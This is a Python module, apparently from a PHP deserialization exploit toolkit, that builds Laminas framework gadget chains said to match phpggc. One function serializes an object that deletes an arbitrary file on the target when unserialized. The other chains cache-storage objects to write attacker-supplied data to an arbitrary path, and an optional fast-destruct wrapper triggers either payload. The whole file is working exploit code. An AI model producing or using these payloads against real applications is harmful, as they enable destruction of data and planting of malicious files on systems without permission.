"""Laminas gadget chains — byte-identical to ambionics/phpggc."""
from __future__ import annotations

import os

from ..platform import maybe_wrap
from ..serialize import php_arr, php_int, php_obj, php_str, prot


def build_fd1(remote_path: str, *, fast_destruct: bool = False) -> bytes:
    stream = php_obj("Laminas\\Http\\Response\\Stream", [
        ("cleanup", php_str("1")),
        ("streamName", php_str(remote_path)),
    ])
    return maybe_wrap(stream, fast_destruct)


def build_fw1(remote_path: str, data: str, *, fast_destruct: bool = False) -> bytes:
    infos = os.path.splitext(remote_path)
    extension = infos[1].lstrip(".") if infos[1] else ""
    filename = infos[0].rsplit("/", 1)[-1] if infos[0] else ""
    dirname = os.path.dirname(remote_path) or "."

    options = php_obj("Laminas\\Cache\\Storage\\Adapter\\FilesystemOptions", [
        (prot("namespace"), php_str("")),
        (prot("keyPattern"), php_str("/.*/")),
        (prot("cacheDir"), php_str(dirname)),
        (prot("dirLevel"), php_int(0)),
        (prot("suffix"), php_str(extension)),
    ])
    storage = php_obj("Laminas\\Cache\\Storage\\Adapter\\Filesystem", [
        (prot("options"), options),
    ])
    item = php_obj("Laminas\\Cache\\Psr\\CacheItemPool\\CacheItem", [
        (prot("key"), php_str(filename)),
        (prot("value"), php_str(data)),
    ])
    decorator = php_obj("Laminas\\Cache\\Psr\\CacheItemPool\\CacheItemPoolDecorator", [
        (prot("storage"), storage),
        (prot("deferred"), php_arr([(php_int(0), item)])),
    ])
    return maybe_wrap(decorator, fast_destruct)
